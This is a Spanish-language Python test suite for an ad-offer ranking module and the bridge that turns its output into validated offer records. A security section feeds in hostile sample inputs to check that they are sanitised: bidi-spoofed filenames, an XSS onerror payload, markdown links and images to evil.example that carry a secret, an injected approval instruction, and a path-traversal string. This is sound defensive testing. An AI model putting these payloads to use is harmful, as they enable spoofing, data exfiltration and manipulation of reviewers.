        self.assertIn("es_oferta_digital_pago_unico", texto)
        pm.validar_fichas(fichas, self.p)

    def test_sin_titulos_sin_traccion_sigue_descartada_con_su_motivo(self):
        pagina = med(1, "completa", 5, "3", edad_piso=False, titulos=[], conceptos=1)
        doc = self.rank_cons([pagina], [], [self.sin_titulos(1)])
        self.assertEqual(doc["sin_tema"], [])
        d = doc["descartadas"][0]
        self.assertEqual((d["page_id"], d["motivos"], d["tema_slug"]), (pid(1), ["sin_etiqueta: sin_titulos"], None))
        self.assertEqual(doc["resumen"]["descartadas_por_motivo"], {"sin_etiqueta": 1})

    def test_sin_titulos_con_piso_insuficiente_no_se_descarta(self):
        pagina = med(1, "parcial", 5, "3", titulos=[], conceptos=1)
        doc = self.rank_cons([pagina], [], [self.sin_titulos(1)])
        self.assertEqual([r["estado_traccion"] for r in doc["sin_tema"]], ["indeterminada_por_muestra"])
        self.assertEqual(doc["descartadas"], [])

    def test_otros_motivos_de_sin_etiquetar_no_se_rescatan_aunque_tengan_traccion(self):
        for motivo in ("lote_sin_salida", "etiqueta_rechazada", "salida_invalida", "no_etiquetada"):
            with self.subTest(motivo=motivo):
                pagina = med(1, "completa", 27, "14.06", edad_piso=False, conceptos=1)
                doc = self.rank_cons([pagina], [], [self.sin_titulos(1, motivo)])
                self.assertEqual(doc["sin_tema"], [])
                self.assertEqual(doc["descartadas"][0]["motivos"], [f"sin_etiqueta: {motivo}"])

    def test_sin_el_consolidado_no_se_sabe_por_que_no_tiene_etiqueta_y_no_se_rescata(self):
        pagina = med(1, "completa", 27, "14.06", edad_piso=False, titulos=[], conceptos=1)
        doc = self.rank([pagina], [])
        self.assertEqual(doc["sin_tema"], [])
        self.assertEqual(doc["descartadas"][0]["motivos"], ["sin_etiqueta"])

    def test_sin_titulos_y_con_etiqueta_valida_no_cambia(self):
        pagina = med(1, "completa", 27, "14.06", edad_piso=False, conceptos=1)
        doc = self.rank_cons([pagina], [et(1)], [])
        self.assertEqual(len(doc["temas"]), 1)
        self.assertEqual(doc["sin_tema"], [])

    def test_clones_sin_titulos_no_se_agrupan_porque_no_tienen_titulos(self):
        paginas = [med(n, "completa", 27, "14.06", edad_piso=False, titulos=[], conceptos=1) for n in (1, 2)]
        doc = self.rank_cons(paginas, [], [self.sin_titulos(1), self.sin_titulos(2)])
        self.assertEqual([r["cuenta_como_independiente"] for r in doc["sin_tema"]], [True, True])

    def test_el_resumen_cuadra(self):
        paginas = [med(1, "completa", 27, "14.06", edad_piso=False, titulos=[], conceptos=1),
                   med(2, "completa", 5, "3", edad_piso=False, titulos=[], conceptos=1), pg(3, paises=["US"])]
        doc = self.rank_cons(paginas, [et(3, "tema-b")], [self.sin_titulos(1), self.sin_titulos(2)])
        r = doc["resumen"]
        self.assertEqual((r["paginas_en_temas"], r["paginas_sin_tema"], r["paginas_descartadas"]), (1, 1, 1))
        self.assertEqual(r["paginas_en_temas"] + r["paginas_sin_tema"] + r["paginas_descartadas"], r["paginas_total"])
        self.assertEqual(r["paginas_por_verificar"], 1)


class PruebaM6EntrantesPiso(Base):
    def memoria(self, piso):
        mem = cargar("memoria_b3_ok.json")
        if piso is not None:
            mem["entrantes_30d_piso_por_pais"] = piso
        return mem

    NOTA = "entrantes_30d es un piso (muestra truncada)"

    def ofertas(self, doc, mem):
        return {o["modelo_id"].split("-" + pid(1))[0][:6]: o for o in
                ranking.puente_a_fichas(doc, mem, self.p)["ofertas"]}

    def crochet(self, fichas):
        return next(o for o in fichas["ofertas"] if o["modelo_id"].startswith("crochet-patrones"))

    def test_con_piso_la_ficha_lo_declara_en_pendiente(self):
        mem = self.memoria({"crochet-patrones": {"BR": True, "US": True}})
        o = self.crochet(ranking.puente_a_fichas(self.rank_fix(), mem, self.p))
        self.assertTrue(any(x.startswith(self.NOTA) for x in o["pendiente"]))

    def test_sin_el_campo_nada_cambia(self):
        doc = self.rank_fix()
        con = ranking.puente_a_fichas(doc, self.memoria(None), self.p)
        self.assertFalse(any(x.startswith("entrantes_30d es un piso") for o in con["ofertas"] for x in o["pendiente"]))
        base = json.dumps(con, ensure_ascii=False)
        self.assertEqual(base, json.dumps(ranking.puente_a_fichas(doc, cargar("memoria_b3_ok.json"), self.p), ensure_ascii=False))

    def test_piso_falso_no_agrega_nota(self):
        mem = self.memoria({"crochet-patrones": {"BR": False, "US": False}})
        o = self.crochet(ranking.puente_a_fichas(self.rank_fix(), mem, self.p))
        self.assertFalse(any("es un piso" in x and "entrantes" in x for x in o["pendiente"]))

    def test_basta_un_mercado_con_piso(self):
        mem = self.memoria({"crochet-patrones": {"BR": False, "US": True}})
        o = self.crochet(ranking.puente_a_fichas(self.rank_fix(), mem, self.p))
        self.assertEqual(sum(1 for x in o["pendiente"] if x.startswith(self.NOTA)), 1)

    def test_un_entrantes_null_solo_lleva_el_aviso_de_null(self):
        # atlas: IT y MX sin medir (null); el piso de BR (medido) sí se declara, el de IT/MX no tiene valor que avisar
        mem = self.memoria({"atlas-puntos-gatillo": {"IT": True, "MX": True}})
        fichas = ranking.puente_a_fichas(self.rank_fix(), mem, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].startswith("atlas-puntos-gatillo-atril"))
        self.assertFalse(any(x.startswith(self.NOTA) for x in o["pendiente"]))
        self.assertTrue(any(x.startswith("entrantes_30d: sin base") or "null" in x for x in o["pendiente"]))

    def test_sin_base_valida_no_hay_nota_de_piso(self):
        mem = {**cargar("memoria_sin_base.json"), "entrantes_30d_piso_por_pais": {"crochet-patrones": {"BR": True}}}
        fichas = ranking.puente_a_fichas(self.rank_fix(), mem, self.p)
        self.assertFalse(any(x.startswith(self.NOTA) for o in fichas["ofertas"] for x in o["pendiente"]))

    def test_el_piso_viaja_en_los_candidatos_y_se_usa_si_el_puente_no_recibe_memoria(self):
        doc = self.rank_fix(memoria_diff=self.memoria({"crochet-patrones": {"BR": True, "US": False}}))
        self.assertEqual(self.tema(doc, "crochet-patrones")["entrantes_30d_piso"], {"BR": True, "US": False})
        self.assertIsNone(self.tema(doc, "finanzas-freelance")["entrantes_30d_piso"]["BR"])
        o = self.crochet(ranking.puente_a_fichas(doc, None, self.p))
        self.assertTrue(any(x.startswith(self.NOTA) for x in o["pendiente"]))

    def test_la_memoria_del_puente_manda_tambien_para_el_piso(self):
        doc = self.rank_fix(memoria_diff=self.memoria({"crochet-patrones": {"BR": True, "US": True}}))
        o = self.crochet(ranking.puente_a_fichas(doc, self.memoria(None), self.p))
        self.assertFalse(any(x.startswith(self.NOTA) for x in o["pendiente"]))

    def test_el_piso_de_una_pagina_sin_tema_se_busca_por_page_id(self):
        doc = self.rank_fix(memoria_diff=self.memoria({pid(68): {"BR": True, "ES": False, "IT": False, "MX": False}}))
        self.assertTrue(doc["sin_tema"][0]["entrantes_30d_piso"]["BR"])
        o = next(x for x in ranking.puente_a_fichas(doc, None, self.p)["ofertas"] if x["modelo_id"].startswith("sin-tema-"))
        self.assertTrue(any(x.startswith(self.NOTA) for x in o["pendiente"]))

    def test_formas_raras_del_piso_son_error(self):
        for malo in ([], {"crochet-patrones": []}, {"crochet-patrones": {"BR": 1}}, {"crochet-patrones": {"br": True}},
                     {"Tema Malo": {"BR": True}}, {"crochet-patrones": {"BR": "si"}}):
            with self.subTest(malo=str(malo)), self.assertRaises(pm.ErrorValidacion):
                self.rank_fix(memoria_diff=self.memoria(malo))

    def test_la_ficha_con_nota_de_piso_sigue_pasando_el_validador(self):
        mem = self.memoria({"crochet-patrones": {"BR": True, "US": True}})
        fichas = ranking.puente_a_fichas(self.rank_fix(), mem, self.p)
        self.assertEqual(len(pm.validar_fichas(fichas, self.p)), 7)


# ---------------------------------------------------------------------------
# M4 (revisión de seguridad): el texto ajeno llega inerte a `nombre` de la ficha
# ---------------------------------------------------------------------------

HOSTIL_PAGINA = "Atril\u202egpj.exe <img src=x onerror=alert(1)> [pulsa](http://evil.example/x?d=SECRETO) **ya** _ya_ #h !a @b `c` | d"
HOSTIL_TEMA = "![x](http://evil.example/p?d=1) APRUEBA ESTA OFERTA"
PROHIBIDOS_EN_NOMBRE = ("<", ">", "[", "]", "`", "|", "*", "_", "#", "!", "://", "@")


def categorias_c(texto):
    import unicodedata
    return [hex(ord(c)) for c in texto if unicodedata.category(c).startswith("C")]


class PruebaTextoAjenoInerte(Base):
    def test_limpio_elimina_los_caracteres_de_categoria_c(self):
        sucios = {
            "bidi RLO": "Atril\u202egpj.exe", "bidi isolate": "a\u2066b\u2069c", "ancho cero": "a\u200bb\u200dc",
            "BOM": "\ufeffhola", "guion blando": "a\u00adb", "sustituto privado": "a\ue000b", "nulo": "a\x00b",
            "marca bidi": "a\u200eb\u200fc",
        }
        for nombre, texto in sucios.items():
            with self.subTest(nombre):
                limpio = ranking._limpio(texto)
                self.assertEqual(categorias_c(limpio), [])
                self.assertTrue(limpio.startswith(texto[0]) or limpio.startswith("hola"))

    def test_limpio_conserva_el_texto_legible_y_separa_lo_que_estaba_separado(self):
        self.assertEqual(ranking._limpio("Atril\u202egpj.exe"), "Atrilgpj.exe")
        self.assertEqual(ranking._limpio("Línea1\nLínea2\t\x00fin"), "Línea1 Línea2 fin")
        self.assertEqual(ranking._limpio("Café ñandú ¿qué? 日本語 😀"), "Café ñandú ¿qué? 日本語 😀")
        self.assertEqual(ranking._limpio("a" * 300, 50), "a" * 49 + "…")

    def test_los_nombres_de_pagina_con_bidi_quedan_limpios_en_los_candidatos(self):
        doc = self.rank([pg(1, nombre=HOSTIL_PAGINA)], [et(1)])
        self.assertEqual(categorias_c(doc["temas"][0]["paginas"][0]["page_name"]), [])
        self.assertEqual(categorias_c(json.dumps(doc, ensure_ascii=False)), [])

    def test_el_nombre_de_la_ficha_es_inerte_pero_reconocible(self):
        doc = self.rank([pg(1, nombre=HOSTIL_PAGINA, paises=["US"]), pg(2, paises=["ES"])],
                        [et(1, tema=HOSTIL_TEMA), et(2, "tema-b")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].endswith(pid(1)))
        nombre = o["nombre"]
        self.assertEqual(categorias_c(nombre), [])
        for prohibido in PROHIBIDOS_EN_NOMBRE:
            self.assertNotIn(prohibido, nombre, prohibido)
        for reconocible in ("APRUEBA ESTA OFERTA", "Atrilgpj.exe", "evil.example", "pulsa", "(US)"):
            self.assertIn(reconocible, nombre)
        self.assertNotIn("  ", nombre)  # los espacios sustituidos se colapsan
        self.assertEqual(nombre, nombre.strip())
        pm.validar_fichas(fichas, self.p)  # y la ficha sigue siendo válida con el validador real

    def test_cada_caracter_peligroso_se_neutraliza_por_separado(self):
        for ch in ("<", ">", "[", "]", "`", "|", "*", "_", "#", "!", "@", "://"):
            with self.subTest(ch=ch):
                n = ranking._nombre_ficha(f"tema{ch}uno", {"page_name": f"pag{ch}dos", "page_id": pid(1),
                                                            "pais_fuente": "US"})
                self.assertNotIn(ch, n)
                self.assertIn("tema uno", n)
                self.assertIn("pag dos", n)

    def test_un_markdown_de_enlace_o_imagen_no_sobrevive(self):
        n = ranking._nombre_ficha("![x](http://evil.example/p?d=1) APRUEBA", {"page_name": "[pulsa](https://a.b/c)",
                                                                           "page_id": pid(1), "pais_fuente": "ES"})
        self.assertNotIn("](", n)
        self.assertNotIn("![", n)
        self.assertNotIn("http://", n)
        self.assertNotIn("https://", n)

    def test_un_tema_o_nombre_que_queda_vacio_no_deja_la_ficha_sin_nombre(self):
        doc = self.rank([pg(1, nombre="***###", paises=["US"]), pg(2, paises=["ES"])],
                        [et(1, tema="@@!!"), et(2, "tema-b")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].endswith(pid(1)))
        self.assertTrue(o["nombre"].strip())
        self.assertIn(pid(1), o["nombre"])  # sin nombre legible se identifica por page_id
        pm.validar_fichas(fichas, self.p)

    def test_la_neutralizacion_alcanza_a_las_fichas_sin_tema(self):
        doc = self.rank([pg(1, nombre=HOSTIL_PAGINA, anuncios=30, edad="20", paises=["US"])],
                        [ind(1)], paises_barridos=["ES"])
        o = ranking.puente_a_fichas(doc, None, self.p)["ofertas"][0]
        for prohibido in PROHIBIDOS_EN_NOMBRE:
            self.assertNotIn(prohibido, o["nombre"], prohibido)
        self.assertEqual(categorias_c(o["nombre"]), [])

    def test_modelo_id_y_demas_campos_de_la_ficha_no_llevan_texto_ajeno_sin_limpiar(self):
        doc = self.rank([pg(1, nombre=HOSTIL_PAGINA, paises=["US"]), pg(2, paises=["ES"])],
                        [et(1, tema=HOSTIL_TEMA), et(2, "tema-b")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].endswith(pid(1)))
        self.assertTrue(ranking._es_kebab(o["modelo_id"]))
        self.assertEqual(categorias_c(json.dumps(fichas, ensure_ascii=False)), [])

    def test_nombre_de_ficha_determinista(self):
        doc = self.rank([pg(1, nombre=HOSTIL_PAGINA, paises=["US"]), pg(2, paises=["ES"])],
                        [et(1, tema=HOSTIL_TEMA), et(2, "tema-b")])
        a = json.dumps(ranking.puente_a_fichas(doc, None, self.p), ensure_ascii=False)
        b = json.dumps(ranking.puente_a_fichas(copy.deepcopy(doc), None, self.p), ensure_ascii=False)
        self.assertEqual(a, b)


# ---------------------------------------------------------------------------
# Puente a fichas
# ---------------------------------------------------------------------------

class PruebaPuenteAFichas(Base):
    def fichas(self, doc=None, memoria=None):
        return ranking.puente_a_fichas(doc if doc is not None else self.rank_fix(), memoria, self.p)

    def oferta(self, fichas, prefijo):
        return next(o for o in fichas["ofertas"] if o["modelo_id"].startswith(prefijo))

    # --- validez contra el validador real ---

    def test_el_borrador_pasa_validar_fichas_con_los_parametros_reales(self):
        fichas = self.fichas()
        validadas = pm.validar_fichas(copy.deepcopy(fichas), self.p)
        self.assertEqual(len(validadas), 7)
        fichas_json = json.loads(json.dumps(fichas, ensure_ascii=False))  # tras serializar y leer
        self.assertEqual(len(pm.validar_fichas(fichas_json, self.p)), 7)

    def test_schema_version_de_las_fichas_es_2_0_0(self):
        self.assertEqual(self.fichas()["schema_version"], "2.0.0")
        self.assertEqual(ranking.SCHEMA_FICHAS, "2.0.0")

    def test_validar_fichas_rechaza_un_documento_1_0_0(self):
        fichas = self.fichas()
        fichas["schema_version"] = "1.0.0"
        with self.assertRaises(pm.ErrorValidacion):
            pm.validar_fichas(fichas, self.p)

    def test_el_puntaje_las_deja_todas_incompletas(self):
        pares = pm.puntuar(self.fichas(), self.p)
        self.assertEqual(len(pares), 23)  # 7 fichas × 2, 3, 3, 3, 4, 4, 4 mercados
        self.assertEqual({x["estado"] for x in pares}, {"incompleta"})
        for x in pares:
            self.assertIsNone(x["PM"])
            for puerta in PUERTAS_VIGENTES:
                self.assertIn(puerta, x["pendientes"])

    # --- canarios: reglas retiradas por el dueño ---

    def test_canario_vocabulario_vigente_de_puntaje_modelar(self):
        self.assertEqual(pm.PUERTAS, PUERTAS_VIGENTES)
        self.assertEqual(pm.TRANSFERIBILIDAD, TRANSFERIBILIDAD_VIGENTE)
        self.assertEqual(pm.FORMULA_VERSION, "pm-2")

    def test_las_puertas_son_exactamente_las_tres_vigentes_y_van_null(self):
        for o in self.fichas()["ofertas"]:
            self.assertEqual(tuple(o["puertas"]), PUERTAS_VIGENTES)
            self.assertTrue(all(v is None for v in o["puertas"].values()))

    def test_la_transferibilidad_son_los_tres_componentes_vigentes_y_van_null(self):
        for o in self.fichas()["ofertas"]:
            for m in o["mercados"]:
                self.assertEqual(tuple(m["transferibilidad"]), TRANSFERIBILIDAD_VIGENTE)
                self.assertTrue(all(v is None for v in m["transferibilidad"].values()))

    def test_ninguna_regla_retirada_aparece_en_las_fichas(self):
        texto = json.dumps(self.fichas(), ensure_ascii=False)
        for retirada in RETIRADAS:
            self.assertNotIn(retirada, texto)

    def test_ninguna_regla_retirada_aparece_en_los_candidatos(self):
        texto = json.dumps(self.rank_fix(), ensure_ascii=False)
        for retirada in RETIRADAS:
            self.assertNotIn(retirada, texto)

    def test_si_alguien_reintroduce_una_puerta_vieja_el_validador_real_rechaza_la_ficha(self):
        fichas = copy.deepcopy(self.fichas())
        fichas["ofertas"][0]["puertas"]["commodity_facil_de_modelar"] = None
        with self.assertRaises(pm.ErrorValidacion):
            pm.validar_fichas(fichas, self.p)
        fichas = copy.deepcopy(self.fichas())
        fichas["ofertas"][0]["mercados"][0]["transferibilidad"]["producibilidad"] = None
        with self.assertRaises(pm.ErrorValidacion):
            pm.validar_fichas(fichas, self.p)

    def test_el_puente_toma_el_vocabulario_de_puntaje_modelar_y_no_uno_propio(self):
        doc = self.rank_fix()
        with mock.patch.object(pm, "PUERTAS", PUERTAS_VIGENTES + ("puerta_nueva",)):
            fichas = ranking.puente_a_fichas(doc, None, self.p)  # se autovalida con el vocabulario vivo
            self.assertEqual(tuple(fichas["ofertas"][0]["puertas"]), PUERTAS_VIGENTES + ("puerta_nueva",))
        with mock.patch.object(pm, "TRANSFERIBILIDAD", TRANSFERIBILIDAD_VIGENTE + ("componente_nuevo",)):
            fichas = ranking.puente_a_fichas(doc, None, self.p)
            self.assertEqual(tuple(fichas["ofertas"][0]["mercados"][0]["transferibilidad"]),
                             TRANSFERIBILIDAD_VIGENTE + ("componente_nuevo",))

    # --- contenido de la ficha ---

    def test_solo_las_paginas_que_pasan_la_traccion_tienen_ficha(self):
        ids = [o["modelo_id"].rsplit("-", 1)[1] for o in self.fichas()["ofertas"]]
        self.assertEqual(ids, [pid(11), pid(31), pid(1), pid(2), pid(64), pid(41), pid(68)])
        for no in (12, 13, 21, 22, 32, 51, 61, 62, 63, 65, 66, 67, 3, 69, 70, 71):
            self.assertNotIn(pid(no), ids)

    def test_una_ficha_por_operador(self):
        fichas = self.fichas()
        atlas = [o for o in fichas["ofertas"] if o["modelo_id"].startswith("atlas-puntos-gatillo")]
        self.assertEqual(len(atlas), 2)  # la 1001 y un solo representante del clon 1002/1003
        clon = next(o for o in atlas if o["modelo_id"].endswith(pid(2)))
        self.assertEqual(clon["traccion"]["paginas_misma_landing"], 2)
        self.assertEqual(clon["traccion"]["anunciantes_independientes_mismo_angulo"], 1)

    def test_la_traccion_es_lo_medido(self):
        o = self.oferta(self.fichas(), "crochet-patrones")
        self.assertEqual(o["traccion"], {"anuncios_activos": 27, "edad_oferta_dias": "14.9", "conceptos_unicos": 2,
                                         "paginas_misma_landing": 1, "anunciantes_independientes_mismo_angulo": 2})

    def test_reencuadres_vacios_y_pendientes_declarados(self):
        o = self.oferta(self.fichas(), "crochet-patrones")
        self.assertEqual(o["reencuadres"], [])
        texto = " | ".join(o["pendiente"])
        for esperado in ("puertas", "transferibilidad", "entrantes_30d", "reencuadres", "ventana", "pasada 3"):
            self.assertIn(esperado, texto)

    def test_macro_nicho_de_la_ficha_es_el_de_su_pagina(self):
        f = self.fichas()
        self.assertIsNone(self.oferta(f, "crochet-patrones")["macro_nicho"])
        self.assertEqual(self.oferta(f, "finanzas-freelance")["macro_nicho"], "dinero")  # el tema es «mixto»
        self.assertEqual(self.oferta(f, "recetas-diabeticos")["macro_nicho"], "salud")

    def test_mercados_son_exactamente_los_huecos_de_la_matriz(self):
        doc = self.rank_fix()
        f = ranking.puente_a_fichas(doc, None, self.p)
        for o in f["ofertas"]:
            if o["modelo_id"].startswith("sin-tema-"):
                continue  # su hueco es el del original solo (ver PruebaSinTemaYPorVerificar)
            slug = next(t["tema_slug"] for t in doc["temas"] if o["modelo_id"].startswith(t["tema_slug"] + "-"))
            tema = self.tema(doc, slug)
            self.assertEqual([m["mercado"] for m in o["mercados"]], tema["huecos"])
            for m in o["mercados"]:
                self.assertNotIn(m["mercado"], tema["paises"])
                self.assertEqual(m["hueco"], {"original_presente": False, "anunciantes_sostenidos": 0,
                                              "puntaje_rival": None, "entrantes_30d": None})
                self.assertIn("MUESTRA", m["_nota"])

    def test_idiomas_de_fuente_y_mercados(self):
        o = self.oferta(self.fichas(), "crochet-patrones")
        self.assertEqual(o["fuente"], {"idioma": "es", "pais": "MX"})  # MX antes que ES en barrido_paises_origen
        self.assertEqual({m["mercado"]: m["idioma"] for m in o["mercados"]}, {"BR": "pt", "US": "en"})

    def test_pais_fuente_sigue_la_prioridad_de_paises_de_origen(self):
        atlas1 = self.oferta(self.fichas(), "atlas-puntos-gatillo-atril")
        self.assertEqual(atlas1["fuente"], {"idioma": "en", "pais": "US"})  # [ES, US] → US primero
        doc = self.rank_fix(par_barrido={**self.pb, "barrido_paises_origen": ["ES", "US", "BR", "MX", "IT"]})
        atlas1 = self.oferta(ranking.puente_a_fichas(doc, None, self.p), "atlas-puntos-gatillo-atril")
        self.assertEqual(atlas1["fuente"]["pais"], "ES")

    def test_pais_fuente_sin_prioridad_aplicable_es_el_menor_alfabeticamente(self):
        doc = self.rank([pg(1, paises=["MX", "ES"]), pg(2, paises=["BR"])], [et(1, "tema-a"), et(2, "tema-b")],
                        par_barrido={**self.pb, "barrido_paises_origen": ["US"]})
        self.assertEqual(self.pagina(doc, 1)["pais_fuente"], "ES")

    def test_modelo_id_kebab_unico_y_determinista(self):
        a, b = self.fichas(), self.fichas()
        ids = [o["modelo_id"] for o in a["ofertas"]]
        self.assertEqual(ids, [o["modelo_id"] for o in b["ofertas"]])
        self.assertEqual(len(ids), len(set(ids)))
        self.assertIn("crochet-patrones-crea-y-emprende-" + pid(11), ids)
        for i in ids:
            self.assertTrue(ranking._es_kebab(i), i)

    def test_nombre_de_pagina_hostil_no_rompe_modelo_id_ni_nombre(self):
        for nombre in ("Привет мир", "../../etc/passwd", "A\nB", "   ", "Ñandú & Co.", ""):
            with self.subTest(nombre=nombre):
                doc = self.rank([pg(1, nombre=nombre, anuncios=20, edad="12", paises=["US"]), pg(2, paises=["ES"])],
                                [et(1), et(2, "tema-b")])
                f = ranking.puente_a_fichas(doc, None, self.p)
                self.assertTrue(ranking._es_kebab(f["ofertas"][0]["modelo_id"]))
                self.assertNotIn("\n", f["ofertas"][0]["nombre"])
                self.assertTrue(f["ofertas"][0]["nombre"].strip())

    def test_muestra_truncada_que_pasa_declara_el_piso_en_pendiente(self):
        doc = self.rank([pg(1, anuncios=30, edad="20", trunc=True), pg(2, paises=["ES"])], [et(1), et(2, "tema-b")])
        o = ranking.puente_a_fichas(doc, None, self.p)["ofertas"][0]
        self.assertTrue(any("muestra truncada" in x for x in o["pendiente"]))
        sin = self.oferta(self.fichas(), "crochet-patrones")
        self.assertFalse(any("muestra truncada" in x for x in sin["pendiente"]))

    # --- casos sin ficha ---

    def test_sin_mercado_destino_no_hay_ficha_y_se_explica(self):
        doc = self.rank([pg(1, paises=["US", "ES"])], [et(1)])  # presente en todo el universo
        f = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(f["ofertas"], [])
        self.assertIn("sin_mercado_destino_con_ausencia", f["_nota"])

    def test_sin_temas_que_pasen_el_borrador_queda_vacio(self):
        doc = self.rank([pg(1, anuncios=3, edad="1", conceptos=1), pg(2, paises=["ES"], anuncios=3, edad="1", conceptos=1)],
                        [et(1), et(2, "tema-b")])
        f = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(f["ofertas"], [])
        self.assertTrue(f["_nota"].startswith("corrida_id=2026-11-06-a"))

    def sin_ca(self):
        """Mapa de idiomas sin Canadá (país plurilingüe: no figura, así que su idioma es desconocido)."""
        return {**self.pb, "barrido_idioma_por_pais": dict(self.pb["barrido_idioma_por_pais"])}

    def test_pais_destino_sin_idioma_conocido_no_genera_mercado(self):
        doc = self.rank([pg(1, paises=["US"]), pg(2, paises=["CA"], anuncios=2, edad="1", conceptos=1)],
                        [et(1), et(2, "tema-b")], par_barrido=self.sin_ca())
        self.assertIsNone(doc["idiomas_por_pais"]["CA"])
        self.assertTrue(any("idioma desconocido para CA" in a for a in doc["advertencias"]))
        f = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(f["ofertas"], [])  # el único hueco de tema-a es CA y no tiene idioma
        self.assertIn("sin_mercado_destino_con_ausencia", f["_nota"])

    def test_pais_fuente_sin_idioma_conocido_omite_la_ficha(self):
        doc = self.rank([pg(1, paises=["CA"]), pg(2, paises=["US"], anuncios=2, edad="1", conceptos=1)],
                        [et(1), et(2, "tema-b")], par_barrido=self.sin_ca())
        f = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(f["ofertas"], [])
        self.assertIn("idioma_fuente_desconocido", f["_nota"])

    def test_m9_sin_barrido_idioma_por_pais_falla_cerrado_con_codigo_5(self):
        sin = {k: v for k, v in self.pb.items() if k != "barrido_idioma_por_pais"}
        for par in (sin, {**self.pb, "barrido_idioma_por_pais": None}):
            with self.subTest(par=sorted(par)[-1]):
                with self.assertRaises(pm.ErrorLimite) as ctx:
                    self.rank_fix(par_barrido=par)
                self.assertEqual(ctx.exception.codigo_salida, 5)
                self.assertIn("barrido_idioma_por_pais", str(ctx.exception))

    def test_m9_el_modulo_ya_no_trae_una_tabla_de_idiomas_de_respaldo(self):
        self.assertFalse(hasattr(ranking, "IDIOMA_PRINCIPAL_PAIS"))
        doc = self.rank_fix()
        self.assertFalse(any("respaldo" in a for a in doc["advertencias"]))

    def test_m9_un_pais_que_el_mapa_no_cubre_no_se_adivina(self):
        # US, ES, etc. están en el mapa del fixture; DE no: antes la tabla del módulo lo habría llenado con «de»
        doc = self.rank([pg(1, paises=["DE"])], [et(1)])
        self.assertIsNone(doc["idiomas_por_pais"]["DE"])

    def test_el_parametro_de_idiomas_manda_sobre_la_tabla(self):
        doc = self.rank_fix(par_barrido={**self.pb, "barrido_idioma_por_pais": {**self.pb["barrido_idioma_por_pais"],
                                                                                  "BR": "pt-BR"}})
        self.assertEqual(doc["idiomas_por_pais"]["BR"], "pt-BR")
        o = self.oferta(ranking.puente_a_fichas(doc, None, self.p), "crochet-patrones")
        self.assertEqual({m["mercado"]: m["idioma"] for m in o["mercados"]}["BR"], "pt-BR")

    # --- entradas defectuosas ---

    def test_candidatos_malformados_son_error(self):
        doc = self.rank_fix()
        for malo in (None, [], {}, {**doc, "schema_version": "2.0.0"}, {**doc, "corrida_id": "x"},
                     {k: v for k, v in doc.items() if k != "idiomas_por_pais"},
                     {**doc, "temas": "no"}):
            with self.subTest(malo=type(malo).__name__), self.assertRaises(pm.ErrorValidacion):
                ranking.puente_a_fichas(malo, None, self.p)

    def test_par_modelado_sin_sostenidos_cierre_falla_cerrado(self):
        par = {k: v for k, v in self.p.items() if k != "modelado_sostenidos_cierre"}
        with self.assertRaises(pm.ErrorLimite):
            ranking.puente_a_fichas(self.rank_fix(), None, par)

    def test_el_puente_no_modifica_los_candidatos(self):
        doc = self.rank_fix()
        antes = copy.deepcopy(doc)
        ranking.puente_a_fichas(doc, cargar("memoria_b3_ok.json"), self.p)
        self.assertEqual(doc, antes)


# ---------------------------------------------------------------------------
# Determinismo, tipos persistibles, reloj
# ---------------------------------------------------------------------------

def recorrer(valor):
    yield valor
    if isinstance(valor, dict):
        for v in valor.values():
            yield from recorrer(v)
    elif isinstance(valor, list):
        for v in valor:
            yield from recorrer(v)


class PruebaDeterminismoYTipos(Base):
    def test_mismas_entradas_mismo_documento_incluido_el_orden_de_claves(self):
        a = json.dumps(self.rank_fix(), ensure_ascii=False)
        b = json.dumps(self.rank_fix(), ensure_ascii=False)
        self.assertEqual(a, b)
        fa = json.dumps(ranking.puente_a_fichas(self.rank_fix(), None, self.p), ensure_ascii=False)
        fb = json.dumps(ranking.puente_a_fichas(self.rank_fix(), None, self.p), ensure_ascii=False)
        self.assertEqual(fa, fb)

    def test_el_orden_de_entrada_no_cambia_el_resultado(self):
        base = json.dumps(self.rank_fix(), ensure_ascii=False)
        for semilla in range(5):
            pd, ed = cargar("paginas.json"), cargar("etiquetas.json")
            azar = random.Random(semilla)
            azar.shuffle(pd["paginas"])
            azar.shuffle(ed["paginas"])
            doc = ranking.rankear(pd, ed, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)
            self.assertEqual(json.dumps(doc, ensure_ascii=False), base, f"semilla {semilla}")

    def test_el_orden_de_las_listas_de_paises_y_titulos_no_importa(self):
        pd, ed = cargar("paginas.json"), cargar("etiquetas.json")
        for p in pd["paginas"]:
            p["paises"].reverse()
            p["titulos"].reverse()
        doc = ranking.rankear(pd, ed, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)
        self.assertEqual(json.dumps(doc, ensure_ascii=False), json.dumps(self.rank_fix(), ensure_ascii=False))

    def test_no_muta_las_entradas(self):
        pd, ed = cargar("paginas.json"), cargar("etiquetas.json")
        pb = cargar("par_barrido.json")
        copias = copy.deepcopy((pd, ed, pb))
        ranking.rankear(pd, ed, par_modelado=self.p, par_barrido=pb, ahora=AHORA)
        self.assertEqual((pd, ed, pb), copias)

    def test_nada_de_float_ni_decimal_en_lo_persistido(self):
        for doc in (self.rank_fix(), ranking.puente_a_fichas(self.rank_fix(), cargar("memoria_b3_ok.json"), self.p),
                    self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))):
            for nodo in recorrer(doc):
                self.assertNotIsInstance(nodo, (float, Decimal))
            json.dumps(doc, allow_nan=False)

    def test_entradas_leidas_con_decimal_exacto_tambien_funcionan(self):
        pd = pm.leer_json(FIX / "paginas.json")
        ed = pm.leer_json(FIX / "etiquetas.json")
        doc = ranking.rankear(pd, ed, par_modelado=self.p, par_barrido=cargar("par_barrido.json"), ahora=AHORA)
        self.assertEqual(json.dumps(doc, ensure_ascii=False), json.dumps(self.rank_fix(), ensure_ascii=False))

    def test_generado_en_usa_el_reloj_inyectado(self):
        self.assertEqual(self.rank_fix()["generado_en"], "2026-11-06T07:00:00Z")
        otro = datetime(2027, 1, 2, 3, 4, 5, tzinfo=timezone.utc)
